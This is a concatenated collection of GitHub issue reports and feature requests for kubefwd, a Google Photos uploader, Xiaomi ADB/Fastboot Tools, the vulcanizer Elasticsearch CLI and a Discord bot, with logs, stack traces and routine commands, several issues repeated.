By default, kubefwd looks at path `~/.kube/config` for the configuration file. However, with the -E flag (to choose a custom configuration file) it uses the path specified in KUBECONFIG. kubefwd, unlike kubectl, however doesn't support a list of configuration files in the KUBECONFIG env.

Shouldn't kubefwd rather use the context & config supplied by `kubectl config view`? Hi,

When I execute - 

```docker run --rm --name fwd -v /"$HOME/.kube/config:/root/.kube/config" -it txn2/kubefwd:v1.9.2 services -n default``` 

I receive -

```bash
Error forwarding service: Get https://[IP-ADDRESS]/api/v1/namespaces/default/services: error executing access token 
command "C:\\Program Files (x86)\\Google\\Cloud SDK\\google-cloud-sdk\\bin\\gcloud.cmd config config-helper --format=json": err=exec: "C:\\Program Files (x86)\\Google\\Cloud SDK\\google-cloud-sdk\\bin\\gcloud.cmd": executable file not found in $PATH output= stderr=
```
Although I've added the required path ("C:\Program Files (x86)\Google\Cloud SDK\google-cloud-sdk\bin") to the $PATH environment variable. When I redeploy an application and I stop `kubefwd` to restart as soon as the new pod is ready and the old one is in terminating state, the terminating one is still selected. It would be good to check the readiness of all containers in a pod. Or perhaps use endpoints as the source, because that will only show ready pods. Recently ran into an issue where I fat-fingered a namespace, in a list of many, so the endpoint didn't exist when the code tried to hit it (which I missed because the number of services being forwarded pushed the logs beyond my terminal window). 

After some digging I found that it appears k8s corev1 clientset doesn't alert the user, or error when non-existent namespaces are provided (with valid reason I assume, as one of the functions is to Create that namespace). Would it be worth adding validation on kubefwd to either warn or error if a user provides a namespace that results in no listed services?

It looks like it could be added by doing a check on the length of the `services.Items` slice.
https://github.com/txn2/kubefwd/blob/master/cmd/kubefwd/services/services.go#L243

I'd gladly throw in a PR for this if need be, but understand, since it was user-error, if it's not worth adding. In #52 we changed the behavior so that it matches the "Without Selector" section [here](https://kubernetes.io/docs/concepts/services-networking/service/#headless-services) but broke it for services that do have selector.

For services with a selector there should be a DNS entry with the name of the service pointing to all pods that match (i.e. multiple A records), which in our case it transforms to an another entry in `/etc/hosts/` of course Hello,
I wondered if you have considered to be able to run several independent running kubefwd processes.
I have a lot of different namespaces / projects in a kube cluster and it would be handy to be able to independently start/stop kubefwd for a few resources.

I've seen that the IpC variable is hardcoded, would you accept a PR where it is changed to be variable (and change the way that /etc/hosts is handled)? Hi,

Firstly, great tool! 

Quick question, I followed this example for getting Kafka running: https://imti.co/kafka-kubernetes/. I'm using Docker For Mac (2.0.0.3). When running kubefwd, I get the following output:

<img width="849" alt="Screenshot 2019-04-01 at 15 49 58" src="https://user-images.githubusercontent.com/753647/55337053-db713300-5495-11e9-99f2-b6a56d36a686.png">

I am successfully able to create a new Kafka topic:
/kafka-topics.sh --zookeeper kafka-zookeeper:2181 \
--topic test --create --partitions 1 --replication-factor 1

But when trying to post a message to the topic using the following command, I receive a timeout error:

Tried with:
/kafka-console-producer.sh --topic test --broker-list kafka-headless:9092
/kafka-console-producer.sh --topic test --broker-list kafka:9092

Error:
[2019-04-01 15:50:49,755] WARN [Producer clientId=console-producer] Connection to node 0 (/10.1.0.117:9092) could not be established. Broker may not be available. (org.apache.kafka.clients.NetworkClient)

My hosts file looks as follows:

127.1.27.1       kafka kafka.the-project kafka.the-project.svc.cluster.local
127.1.27.2       kafka-headless kafka-headless.the-project kafka-headless.the-project.svc.cluster.local
127.1.27.3       kafka-zookeeper kafka-zookeeper.the-project kafka-zookeeper.the-project.svc.cluster.local
127.1.27.4       kafka-zookeeper-headless kafka-zookeeper-headless.the-project kafka-zookeeper-headless.the-project.svc.cluster.local

If I post from within a container, then I have no issues.

Am I missing something?
 I'm using ansible to automate kubefwd setup and further upgrades.

Ansible supplies many facts regarding target system. At least all reaquired facts about OS type family and release.

Unfortunately "macOS" is not identifier for macos in official OS facts, but "Darwin" is.
You can test by just typing `uname` in macos terminal:
```
❯ uname
Darwin
```

so for now instead of automatically templating `"kubefwd_{{ ansible_os_family | lower }}_amd64.tar.gz"`
I have to use "if" "when condition"

```
#pseudocode
when: ansible_os_family == "Darwin"
use: kubefwd_macOS_amd64.tar.gz

when: ansible_os_family == "Linux"
use: kubefwd_linux_amd64.tar.gz
```

while above suggested templating will support whatever system putting appropriate "linux" or "darwin" values

here are available system facts (they are not used by ansible, but for example Puppet is seeing same)
```
"ansible_distribution": "MacOSX",
"ansible_os_family": "Darwin",
"ansible_system": "Darwin"
```
https://github.com/ansible/ansible/blob/1d91e0311918d63f1aecfc6ce67596f4808a4976/lib/ansible/module_utils/facts/system/distribution.py#L467

Most other projects use os_family or system, I have never seen MacOSX
 We use `kubefwd` in combination with [Glasses](https://github.com/wakeful/glasses) (actually an alternative build [k8s-ingress-hosts](https://github.com/solsson/k8s-ingress-hosts/)). When kubefwd exits it will reset changes made by Glasses as well. Glasses on the contrary removes only its own entries.

What glasses does is it generates markers `# generated using glasses start #` and `# generated using glasses end #` (see also https://github.com/solsson/k8s-ingress-hosts/commit/ae424643e32f0ce2188a468ef196e53fadf7c2e1). Could kubefwd do the same thing? This is an AWESOME tool to provide devs an easy and secure way of using our development environment on our k8s cluster. 
### The issue
Idle connection timeout is very short, and we can't change `streaming-connection-idle-timeout` setting in our managed kubernetes cluster.

### Proposal
Some kind of flag to either control the port-forwarding tunnel idle timeout (not sure how feasible this would be tho), or one that tells the tool to reconnect the service upon disconnecting.

I'm not a fan of either of those two options but perhaps this is a good conversation starter to find a solution.
<---------->
143772270
Some days ago I was uploading images and it was working fine for hours. Eventually, it stopped due to max daily limits but now weeks later when i re-run the upload i get the error shown:

...
already uploaded: /mnt/dlinknas1/data/pictures/2010/20100830/img_2502.jpg: skipping file...
already uploaded: /mnt/dlinknas1/data/pictures/2010/20100830/img_2503.jpg: skipping file...
already uploaded: /mnt/dlinknas1/data/pictures/2010/20100830/img_2504.jpg: skipping file...
2019/06/20 10:06:02 Uploading img_2505.jpg
2019/06/20 10:06:06 failed uploading image: failed uploading image: status message should be OK, found: Success
 --- at github.com/nmrshll/google-photos-api-client-go/lib-gphotos/client.go:147 (Client.UploadFile) ---
softcoder@softcoder-desktop:~/gphotos-uploader$ 
 HI, your project is awesome, I have a question about "google.golang.org/api/photoslibrary/v1"
For official google photo API clients, it seems be removed (Ref: https://github.com/googleapis/google-api-go-client).

Do you have any idea about this? I just got this error while uploading.
I restarted and it kept on going, so it seems like a transient error. It may not be in your client, but it looks like transient url errors aren't being handled:

2019/05/29 07:42:06 0504191058.jpg uploaded successfully as AO7IUSvd2iUBapey3DdFe6alOyCTvl61kNiACBVTdCWFRUtDtxPPKqLjfSZmGJnYgZd0tDtElTypVkD-zIO13cfJgE5EBWME3g
2019/05/29 07:42:06 Marked as uploaded: /data/sync/nick_V20/Camera/Camera/0504191058.jpg
2019/05/29 07:42:06 Uploading 0504191058a.jpg
panic: interface conversion: error is *url.Error, not *googleapi.Error

goroutine 16 [running]:
github.com/nmrshll/google-photos-api-client-go/lib-gphotos.(*Client).UploadFile(0xc0002709e8, 0xc0002d4180, 0x31, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0)
	/home/poleguy/go/src/github.com/nmrshll/google-photos-api-client-go/lib-gphotos/client.go:123 +0xb4f
github.com/nmrshll/gphotos-uploader-cli/upload.(*FileUpload).upload(0xc0002709b0, 0xc000243fa8, 0x1)
	/home/poleguy/go/src/github.com/nmrshll/gphotos-uploader-cli/upload/fileUpload.go:52 +0x7f
github.com/nmrshll/gphotos-uploader-cli/upload.StartFileUploadWorker.func1(0xc0001c0040)
	/home/poleguy/go/src/github.com/nmrshll/gphotos-uploader-cli/upload/fileUpload.go:32 +0x75
created by github.com/nmrshll/gphotos-uploader-cli/upload.StartFileUploadWorker
	/home/poleguy/go/src/github.com/nmrshll/gphotos-uploader-cli/upload/fileUpload.go:30 +0x87

<---------->
144496524


Serial number:		52886aeb
Codename:		violet
Bootloader:		locked
**Camera2:			unknown**

I believe the status shoule b shown as Camera2 is enabled in note 7 Pro. I have installed GCam app as well. Hello, it's it possible to add more apps to uninstall please? I think many people look forward to your tool update to uninstall more apps. Great work though, I really appreciate your tool!  ![20190526-112107-Xiaomi ADB_Fastboot Tools](https://user-images.githubusercontent.com/6532485/58379140-65c2a880-7fa8-11e9-9dfd-b5946c3df755.png)
The marked text is clearly UTF-8 shown as some single-byte encoding.

Running JVM with explicit `-Dfile.encoding=UTF-8 -Dsun.jnu.encoding=UTF-8 ` helps but that shouldn't be necessary. Hi,

I connected my Xiaomi device with USB debugging enabled and granted permission to connect on my phone. The application detects that my phone is connected and the list of apps shows up, but everything is greyed out. I waited for 10 minutes to see if there'd be any difference and it's still the same. Am I missing something?

This is how the app looks
![ping](https://user-images.githubusercontent.com/12696490/54031637-4d2ac980-41d5-11e9-8233-92a6b5b765e0.JPG)

Thanks!


 I am using the latest release 6.3.2 and reinstaller tab in it is unresponsive. Its greyed out completely and nothing happens when clicked. Also want to report the same issue about smsextra https://github.com/Saki-EU/XiaomiADBFastbootTools/issues/32 . If uninstalled messaging app stops working. any other open source alternative for this sms messaging app? Or a variation of it for better compatibility.
Something like `[App name;]appId` would work.
Because seeing a list of 100500 "s600ww" applications after adding from the file is least entertaining. Hi, you built a very nice program, and you have a very useful site.
All the knowledge about Xiaomi devices is great. 

I'm wanted to built such a tool myself, and I happened to face your project.

I suggest you to enter support for super user commands.
There is people with rooted devices but don't know to use adb.

A small issue,
when I run the project sometimes I get an error about dummy.img file. Hi,

I connected my Xiaomi device with USB debugging enabled and granted permission to connect on my phone. The application detects that my phone is connected and the list of apps shows up, but everything is greyed out. I waited for 10 minutes to see if there'd be any difference and it's still the same. Am I missing something?

This is how the app looks
![ping](https://user-images.githubusercontent.com/12696490/54031637-4d2ac980-41d5-11e9-8233-92a6b5b765e0.JPG)

Thanks!


 Firstly, the program is excellent. But .. At the standard resolution of the laptop 1366x768, the interface is not fully displayed. An annoying flaw. Screen Attachment File
![skrin](https://user-images.githubusercontent.com/49121536/55289651-698be180-53e2-11e9-9250-5f96e0e9b8e9.PNG)
 Hi, you built a very nice program, and you have a very useful site.
All the knowledge about Xiaomi devices is great. 

I'm wanted to built such a tool myself, and I happened to face your project.

I suggest you to enter support for super user commands.
There is people with rooted devices but don't know to use adb.

A small issue,
when I run the project sometimes I get an error about dummy.img file. I triedevery thing i know to make it work but the JAVA version just freeze on my windows 10 x64
my phone is Redmi 6
I tried the old win32 version and voila every thing is perfect.  hi. i have mi 8 and xiaomi.eu rom.
used your app for deleting stock Camera and Xiaomi Market.
Now reinstalling ROM from twrp not helping to restore this apps. Why? ![imagen](https://user-images.githubusercontent.com/10070510/55259393-83d38d00-5233-11e9-9960-724e1e0632c4.png)
 Hello,
I had a little adventure with the 'Reinstaller' module/tab, when I tried to restore the applications 
I got a message:

`App: Mi File Manager`
`Package: com.mi.android.globalFileexplorer`
`Result: Failure [Unknown command: install-existing]`

`Done!`

//My spec:
Redmi4x 'santoni' 10.1.1.0(NAMMFI) global-ota
Android: 7.1.2
This is probably due to the android version (lack of command in 'package')

Workaround is manual install application from system location @ ADB shell:
`cd /system/app/SmsExtra/`
`pm install -r --user 0 SmsExtra.apk`

I know that it can be difficult to implement, but it can be a hint for someone.

Greetings
 I triedevery thing i know to make it work but the JAVA version just freeze on my windows 10 x64
my phone is Redmi 6
I tried the old win32 version and voila every thing is perfect.  ![imagen](https://user-images.githubusercontent.com/10070510/55259393-83d38d00-5233-11e9-9960-724e1e0632c4.png)
 I am using the latest release 6.3.2 and reinstaller tab in it is unresponsive. Its greyed out completely and nothing happens when clicked. Also want to report the same issue about smsextra https://github.com/Saki-EU/XiaomiADBFastbootTools/issues/32 . If uninstalled messaging app stops working. any other open source alternative for this sms messaging app?  ![imagen](https://user-images.githubusercontent.com/10070510/55259393-83d38d00-5233-11e9-9960-724e1e0632c4.png)
 I am confused with reinstaller in XiaomiADBFastbootTools. When we are uninstalling apps using XiaomiADBFastbootTools is it completely deleting the apps or just disabling it. Because I am deleting apps to get more space for my phone. Can you light some info on this? 

Serial number:		52886aeb
Codename:		violet
Bootloader:		locked
**Camera2:			unknown**

I believe the status shoule b shown as Camera2 is enabled in note 7 Pro. I have installed GCam app as well.
<---------->
144591780
Currently we can password passwords only by `vulcanizer.yaml` configuration file or in cmdline.

Can/Should we allow password as prompt if not provided after `--password` flag? (or new flag all together) Hi!

As I understand right now it's possible to pass only a single host per cluster which is not very convenient since ES could easily survive a failer of a single node and continue to work.

I'd like to pass a list of hosts and make vulcanizer try to connect to them all in some kind of order with some kind of timeouts.

Does it make sense? **Note:** when I say "private" I mean elasticsearch indices beginning with a `.` (i.e `.security-*` indices or `.watches` index etc..) couldn't find the official term.

Use case is if I want to check the index settings for a `.security` index (assume this exists in the cluster). Right now if I pass in `.security` into the [GetIndexSettings function](https://github.com/github/vulcanizer/blob/master/es.go#L1008), the underlying function call `handleErrWithBytes` correctly retrieves the necessary info - however when calling [get bytes](https://godoc.org/github.com/tidwall/gjson#GetBytes), it will 'fail' and return an empty [Result object](https://godoc.org/github.com/tidwall/gjson#Result) 

I think this is because the [underlying Get function](https://github.com/tidwall/gjson/blob/dc5b8eacf499360f037a149e5cdf4e15ee73d1f0/gjson.go#L1425) requires input strings to escape `.` characters but the `handleErrWithBytes` just takes the value as is. Thus, if I pass in a string with an escaped `.` then the `handleErrWithBytes` will return an empty body but if assuming I somehow got the body JSON response back - then the [underlying Get function](https://github.com/tidwall/gjson/blob/dc5b8eacf499360f037a149e5cdf4e15ee73d1f0/gjson.go#L1425) would have properly retrieved the string because I escaped the `.` and it would know how to interpret that `path`.

I have a current workaround which is just to pass in `*security` into the `GetIndexSettings` function - but I feel like the ideal would not have to do that. Let me know if you'd like some example code or need anymore clarification. Am I understanding your library correctly that currently there is no way to create a new client to interact with elasticsearch by just passing in the elasticsearch username, host, port and password to create a connection with a certain elasticsearch host? 

I have credentials that I'd much rather just pass into a function to create a client rather than writing to a file like `~/.vulcanizer.yaml` and then calling `NewClient()` on after writing to that file. Thanks

  Issue: When trying to access an Elasticsearch Domain behind a loadbalancer, a port is being forcibly attached to the request.

```bash
❯ vulcanizer settings -c prod
Error getting settings: dial tcp 0.0.0.0:0: connect: can't assign requested address
Get http://elasticsearchdomain.es.amazonaws.com:0/_cluster/settings: dial tcp 0.0.0.0:0: connect: can't assign requested address
```

Proposed Solution: If no port is specified in the .vulcanizer.yaml, no port should be attached to the request URL. I have a need to get disk allocation/usage information from the `_cat/allocation` API. Ideally it would combine with the information from `_cat/nodes`/`GetNodes()`.

I have a working PR at https://github.com/github/vulcanizer/pull/69 that implements this by adding the disk allocation information to the existing Node struct. It should probably be a flag or subcommand in the CLI for `vulcanizer nodes`. Flag would probably be tidier. **Note:** when I say "private" I mean elasticsearch indices beginning with a `.` (i.e `.security-*` indices or `.watches` index etc..) couldn't find the official term.

Use case is if I want to check the index settings for a `.security` index (assume this exists in the cluster). Right now if I pass in `.security` into the [GetIndexSettings function](https://github.com/github/vulcanizer/blob/master/es.go#L1008), the underlying function call `handleErrWithBytes` correctly retrieves the necessary info - however when calling [get bytes](https://godoc.org/github.com/tidwall/gjson#GetBytes), it will 'fail' and return an empty [Result object](https://godoc.org/github.com/tidwall/gjson#Result) 

I think this is because the [underlying Get function](https://github.com/tidwall/gjson/blob/dc5b8eacf499360f037a149e5cdf4e15ee73d1f0/gjson.go#L1425) requires input strings to escape `.` characters but the `handleErrWithBytes` just takes the value as is. Thus, if I pass in a string with an escaped `.` then the `handleErrWithBytes` will return an empty body but if assuming I somehow got the body JSON response back - then the [underlying Get function](https://github.com/tidwall/gjson/blob/dc5b8eacf499360f037a149e5cdf4e15ee73d1f0/gjson.go#L1425) would have properly retrieved the string because I escaped the `.` and it would know how to interpret that `path`.

I have a current workaround which is just to pass in `*security` into the `GetIndexSettings` function - but I feel like the ideal would not have to do that. Let me know if you'd like some example code or need anymore clarification. I've been trying the snapshot functionallity of vulcanizer but when I run `list` command while a snapshot process is running the `FINISHED` and `DURATION` columns show this information:
```
$ vulcanizer snapshot -c c0 list -r r0
+-------------+-----------+----------------------+-------------------+
|    STATE    |   NAME    |       FINISHED       |     DURATION      |
+-------------+-----------+----------------------+-------------------+
| IN_PROGRESS | test      | 1970-01-01T00:00:00Z | -431225h3m27.241s |
+-------------+-----------+----------------------+-------------------+
```

If I curl the `_snapshot` endpoint of the Elasticsearch cluster I can see that `end_time` is actually wrong:
```
$ curl -X GET "localhost:9200/_snapshot/r0/_current" | jq .  
{
  "snapshots": [
    {
      "snapshot": "test",
      "uuid": "f3jm-sDnTHqmLrEq-JLEpw",
      "version_id": 5061099,
      "version": "5.6.10",
      "indices": [
        ".ltrstore",
        "live",
        "settings"
      ],
      "state": "IN_PROGRESS",
      "start_time": "2019-03-12T17:03:27.241Z",
      "start_time_in_millis": 1552410207241,
      "end_time": "1970-01-01T00:00:00.000Z",
      "end_time_in_millis": 0,
      "duration_in_millis": -1552410207241,
      "failures": [],
      "shards": {
        "total": 0,
        "failed": 0,
        "successful": 0
      }
    }
  ]
}

```
Once the snapshot finished, the `FINISHED` and `DURATION` columns show a correct result.

If this is an issue of ES, should vulcanizer check this before showing weird results? First of all, thanks a ton for this library, makes my life so much easier managing Elasticsearch!!

My usecase for this is the following. I defer a `RestoreClusterSettings()` function so that I can reset whatever settings I've made changes to during operation after I'm done, or I cancel.
The `originalValue, newValue := SetClusterSetting(...)` pattern makes this really easy, _however_, if this setting was unset previously the `originalValue` is an empty string.

This leads to the following error when I restore cluster settings:
```
failed to restore cluster setting indices.recovery.max_bytes_per_sec: Bad HTTP Status from Elasticsearch: 400, {"error":{"root_cause":[{"type":"remote_transport_exception","reason":"[mynode][10.1337.1.1:9300][cluster:admin/settings/update]"}],"type":"illegal_argument_exception","reason":"failed to parse setting [indices.recovery.max_bytes_per_sec] with value [] as a size in bytes: unit is missing or unrecognized","caused_by":{"type":"parse_exception","reason":"failed to parse setting [indices.recovery.max_bytes_per_sec] with value [] as a size in bytes: unit is missing or unrecognized"}},"status":400}
```

It would be nice if either `SetClusterSetting` could handle this, or if we created a new function to set a setting to Null in Elasticsearch (to fall back to the default value).

Resetting a value in 7.5: https://www.elastic.co/guide/en/elasticsearch/reference/7.5/cluster-update-settings.html
This procedure is the same in 5.x as well, so shouldn't be a breaking change: https://www.elastic.co/guide/en/elasticsearch/reference/5.0/cluster-update-settings.html Hi!
Each command that I try looks like adding strange double slash symbols `//`
```
vulcanizer -f conf/vulcanizer.yaml -c local settings
Error getting settings: Bad HTTP Status from Elasticsearch: 400, No handler found for uri [///_cluster/settings] and method [GET]
```

My config:
```
conf/vulcanizer.yaml
local:
  host: "test-run-kproskurin-01"
  port: 9200
```

Am I doing something wrong? I've been trying the snapshot functionallity of vulcanizer but when I run `list` command while a snapshot process is running the `FINISHED` and `DURATION` columns show this information:
```
$ vulcanizer snapshot -c c0 list -r r0
+-------------+-----------+----------------------+-------------------+
|    STATE    |   NAME    |       FINISHED       |     DURATION      |
+-------------+-----------+----------------------+-------------------+
| IN_PROGRESS | test      | 1970-01-01T00:00:00Z | -431225h3m27.241s |
+-------------+-----------+----------------------+-------------------+
```

If I curl the `_snapshot` endpoint of the Elasticsearch cluster I can see that `end_time` is actually wrong:
```
$ curl -X GET "localhost:9200/_snapshot/r0/_current" | jq .  
{
  "snapshots": [
    {
      "snapshot": "test",
      "uuid": "f3jm-sDnTHqmLrEq-JLEpw",
      "version_id": 5061099,
      "version": "5.6.10",
      "indices": [
        ".ltrstore",
        "live",
        "settings"
      ],
      "state": "IN_PROGRESS",
      "start_time": "2019-03-12T17:03:27.241Z",
      "start_time_in_millis": 1552410207241,
      "end_time": "1970-01-01T00:00:00.000Z",
      "end_time_in_millis": 0,
      "duration_in_millis": -1552410207241,
      "failures": [],
      "shards": {
        "total": 0,
        "failed": 0,
        "successful": 0
      }
    }
  ]
}

```
Once the snapshot finished, the `FINISHED` and `DURATION` columns show a correct result.

If this is an issue of ES, should vulcanizer check this before showing weird results? Hi!
Each command that I try looks like adding strange double slash symbols `//`
```
vulcanizer -f conf/vulcanizer.yaml -c local settings
Error getting settings: Bad HTTP Status from Elasticsearch: 400, No handler found for uri [///_cluster/settings] and method [GET]
```

My config:
```
conf/vulcanizer.yaml
local:
  host: "test-run-kproskurin-01"
  port: 9200
```

Am I doing something wrong? Hi!

As I understand right now it's possible to pass only a single host per cluster which is not very convenient since ES could easily survive a failer of a single node and continue to work.

I'd like to pass a list of hosts and make vulcanizer try to connect to them all in some kind of order with some kind of timeouts.

Does it make sense? Am I understanding your library correctly that currently there is no way to create a new client to interact with elasticsearch by just passing in the elasticsearch username, host, port and password to create a connection with a certain elasticsearch host? 

I have credentials that I'd much rather just pass into a function to create a client rather than writing to a file like `~/.vulcanizer.yaml` and then calling `NewClient()` on after writing to that file. Thanks

 When running `script/test` or `script/integration-test` my test cases always run fine, but I get this panic at the end:

```
INFO [lintersdb] Active 8 linters: [deadcode errcheck govet ineffassign megacheck structcheck typecheck varcheck] 
INFO [loader] Go packages loading at mode load deps types and syntax took 1.09808926s 
INFO [loader] SSA repr building took 9.743µs      
INFO [runner/skip dirs] sorted abs args: [/Users/jfudally/go/src/github.com/github/vulcanizer] 
INFO [runner] worker.10 took 4.856µs              
INFO [runner] worker.9 took 4.412µs               
INFO [runner] worker.11 took 5.524µs              
INFO [runner] worker.4 took 7.41µs                
INFO [runner] worker.6 took 5.302µs               
INFO [runner] worker.12 took 676.314µs with stages: errcheck: 668.225µs 
INFO [runner] worker.1 took 1.187459ms with stages: structcheck: 1.170657ms, typecheck: 2.98µs 
INFO [runner] worker.5 took 1.487666ms with stages: deadcode: 1.475917ms 
INFO [runner] worker.2 took 2.193127ms with stages: varcheck: 2.180181ms 
INFO [runner] worker.3 took 7.106743ms with stages: ineffassign: 7.092986ms 
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x0 pc=0x163990c]

goroutine 1997 [running]:
github.com/golangci/golangci-lint/vendor/github.com/golangci/go-tools/lint.(*fnVisitor).Visit(0xc0119c0720, 0x1a28ee0, 0xc010abc300, 0x1009b98, 0x17bea40)
        /home/travis/gopath/src/github.com/golangci/golangci-lint/vendor/github.com/golangci/go-tools/lint/lint.go:837 +0x39c
github.com/golangci/golangci-lint/vendor/github.com/golangci/go-tools/lint.(*globalVisitor).Visit(0xc0119c0700, 0x1a28ee0, 0xc010abc300, 0x1a25420, 0xc0119c0700)
        /home/travis/gopath/src/github.com/golangci/golangci-lint/vendor/github.com/golangci/go-tools/lint/lint.go:820 +0xc2
go/ast.Walk(0x1a25420, 0xc0119c0700, 0x1a28ee0, 0xc010abc300)
        /home/travis/.gimme/versions/go1.11.1.linux.amd64/src/go/ast/walk.go:52 +0x66
go/ast.walkDeclList(0x1a25420, 0xc0119c0700, 0xc00bea3800, 0x37, 0x40)
        /home/travis/.gimme/versions/go1.11.1.linux.amd64/src/go/ast/walk.go:38 +0x9e
go/ast.Walk(0x1a25420, 0xc0119c0700, 0x1a28e60, 0xc001703000)
        /home/travis/.gimme/versions/go1.11.1.linux.amd64/src/go/ast/walk.go:353 +0x2656
github.com/golangci/golangci-lint/vendor/github.com/golangci/go-tools/lint.NodeFns.func1(0xc01042e740, 0xc010dd0f60, 0xc010bea9f0)
        /home/travis/gopath/src/github.com/golangci/golangci-lint/vendor/github.com/golangci/go-tools/lint/lint.go:787 +0x74
created by github.com/golangci/golangci-lint/vendor/github.com/golangci/go-tools/lint.NodeFns
        /home/travis/gopath/src/github.com/golangci/golangci-lint/vendor/github.com/golangci/go-tools/lint/lint.go:784 +0xe7
```

After some experimentation I noticed that after I upgraded to golangci-lint version 1.12 some warnings were revealed:

```
WARN [runner/megacheck] Can't run megacheck because of compilation errors in packages [github.com/github/vulcanizer/cmd/vulcanizer github.com/github/vulcanizer [github.com/github/vulcanizer.test]]: cmd/vulcanizer/allocation.go:1: /usr/local/Cellar/go/1.12.1/libexec/src/internal/bytealg/compare_amd64.s:5:1: illegal character U+0023 '#' and 65 more errors: run `golangci-lint run --no-config --disable-all -E typecheck` to see all errors 
INFO [runner] worker.6 took 819.498918ms with stages: megacheck: 819.457656ms 
INFO [runner] worker.1 took 836.366061ms with stages: typecheck: 836.351286ms 
INFO [runner] Workers idle times: #2: 836.34663ms, #3: 829.386557ms, #4: 836.298983ms, #5: 836.267343ms, #6: 16.983322ms, #7: 836.360184ms, #8: 836.311028ms, #9: 836.30117ms, #10: 836.286849ms, #11: 836.293199ms, #12: 836.317279ms 
INFO [runner] processing took 4.294101ms with stages: exclude: 1.599941ms, skip_dirs: 1.196091ms, cgo: 1.017974ms, source_code: 155.118µs, path_prettifier: 113.237µs, autogenerated_exclude: 101.29µs, nolint: 93.31µs, uniq_by_line: 8.445µs, max_same_issues: 2.85µs, path_shortener: 2.457µs, max_per_file_from_linter: 2.023µs, max_from_linter: 893ns, diff: 262ns, skip_files: 210ns 
cmd/vulcanizer/allocation.go:1: /usr/local/Cellar/go/1.12.1/libexec/src/reflect/asm_amd64.s:5:1: illegal character U+0023 '#' (typecheck)
package main
es.go:1: /usr/local/Cellar/go/1.12.1/libexec/src/reflect/asm_amd64.s:5:1: illegal character U+0023 '#' (typecheck)
package vulcanizer

```

Seems that it's trying to lint the cgo files as .go files, and I've found an issue with golangci-lint to validate: https://github.com/golangci/golangci-lint/issues/433 .  Issue: When trying to access an Elasticsearch Domain behind a loadbalancer, a port is being forcibly attached to the request.

```❯ vulcanizer settings -c prod
Error getting settings: dial tcp: lookup https: no such host
Get http://elasticsearchdomainplaceholder.us-west-2.es.amazonaws.com:0/_cluster/settings: dial tcp: lookup https: no such host```

Proposed Solution: If no port is specified in the .vulcanizer.yaml, no port should be attached to the request URL. Issue: When trying to access an Elasticsearch Domain behind a loadbalancer, a port is being forcibly attached to the request.

```bash
❯ vulcanizer settings -c prod
Error getting settings: dial tcp 54.191.115.231:0: connect: can't assign requested address
Get http://elasticsearchdomain.es.amazonaws.com:0/_cluster/settings: dial tcp 54.191.115.231:0: connect: can't assign requested address
```

Proposed Solution: If no port is specified in the .vulcanizer.yaml, no port should be attached to the request URL. I saw in the functionality `diff mappings in the file `ROADMAP.md`.
Have you already given any thought on how will this be implemented ? (using git ?)

The desired behaviour using the CLI, I guess would be to print the diff git style on the console, but how should this functionality behave in vulcanizer when used as a library ?
 Issue: When trying to access an Elasticsearch Domain behind a loadbalancer, a port is being forcibly attached to the request.

```bash
❯ vulcanizer settings -c prod
Error getting settings: dial tcp 54.191.115.231:0: connect: can't assign requested address
Get http://elasticsearchdomain.es.amazonaws.com:0/_cluster/settings: dial tcp 54.191.115.231:0: connect: can't assign requested address
```

Proposed Solution: If no port is specified in the .vulcanizer.yaml, no port should be attached to the request URL.
<---------->
144739449
在session的传参中没加上redis的安全验证，这样如果redis有安全验证就用不了了。。。 在session的传参中没加上redis的安全验证，这样如果redis有安全验证就用不了了。。。
<---------->
144748146
**Is your feature request related to a problem? Please describe.**
Yes, waste of space and disconnected embeds. Having each separate String for the embeds also sucks because it takes forever to make one embed.

**Describe the solution you'd like**
Make all embeds in the en-US.js file and then have the language.get methods just return them

**Describe alternatives you've considered**
Current solution

**Additional context**
![image](https://user-images.githubusercontent.com/46133336/57200496-cd15ab80-6f5a-11e9-9771-25dcbd5a9d78.png)
![image](https://user-images.githubusercontent.com/46133336/57200499-d4d55000-6f5a-11e9-800d-4ed2a4a6db8d.png)

 Hii~~

I fixie wixied the JSON-API fucksy wucksie!!! xpp

i repwaced the prototypes.func wiff a more ~streamylined~ kawaii
pwototypiee.funkywunks object that make the JS go sooper dooper fast!!
xD *starts twerking*

Can u pwease merge my pwull wequest senpai?!! UwU filo not best girl!!! >:( Hii~~

I fixie wixied the JSON-API fucksy wucksie!!! xpp

i repwaced the prototypes.func wiff a more ~streamylined~ kawaii
pwototypiee.funkywunks object that make the JS go sooper dooper fast!!
xD *starts twerking*

Can u pwease merge my pwull wequest senpai?!! UwU **Is your feature request related to a problem? Please describe.**
Not related to a problem

**Describe the solution you'd like**
Implement MongoDB, as SettingsGateway provider as it will have better performance under multiple guilds, clients, and users

**Describe alternatives you've considered**
Current system, which I believe is JSON or SQLite

**Additional context**
This will allow for easier implementation of Moderation commands

Provider:
https://github.com/dirigeants/klasa-pieces/blob/master/providers/mongodb.js
 **Is your feature request related to a problem? Please describe.**
The current whois command uses the avatarURL() funtion which returns a link to a .webp link.
Since not every platform is capable to display .webp image we should consider either removing the avatars completely, switching to a more compatible format or just wait until .webp is either adopted or abandoned.

**Describe the solution you'd like**

- Wait until vendors add or abandon .webp
- Use .png (preferred) or .jpg (not preferred)
- Remove all avatars

**Describe alternatives you've considered**
As above.

**Additional context**
Pls discuss.
 **Is your feature request related to a problem? Please describe.**
A clear and concise description of what the problem is. Ex. I'm always frustrated when [...]

**Describe the solution you'd like**
A clear and concise description of what you want to happen.

**Describe alternatives you've considered**
A clear and concise description of any alternative solutions or features you've considered.

**Additional context**
Add any other context or screenshots about the feature request here.
 Currently only plays the first song in the mix/station **Is your feature request related to a problem? Please describe.**
Yes, waste of space and disconnected embeds. Having each separate String for the embeds also sucks because it takes forever to make one embed.

**Describe the solution you'd like**
Make all embeds in the en-US.js file and then have the language.get methods just return them

**Describe alternatives you've considered**
Current solution

**Additional context**
![image](https://user-images.githubusercontent.com/46133336/57200496-cd15ab80-6f5a-11e9-9771-25dcbd5a9d78.png)
![image](https://user-images.githubusercontent.com/46133336/57200499-d4d55000-6f5a-11e9-800d-4ed2a4a6db8d.png)

 **Is your feature request related to a problem? Please describe.**
Not related to a problem

**Describe the solution you'd like**
Implement MongoDB, as SettingsGateway provider as it will have better performance under multiple guilds, clients, and users

**Describe alternatives you've considered**
Current system, which I believe is JSON or SQLite

**Additional context**
This will allow for easier implementation of Moderation commands

Provider:
https://github.com/dirigeants/klasa-pieces/blob/master/providers/mongodb.js
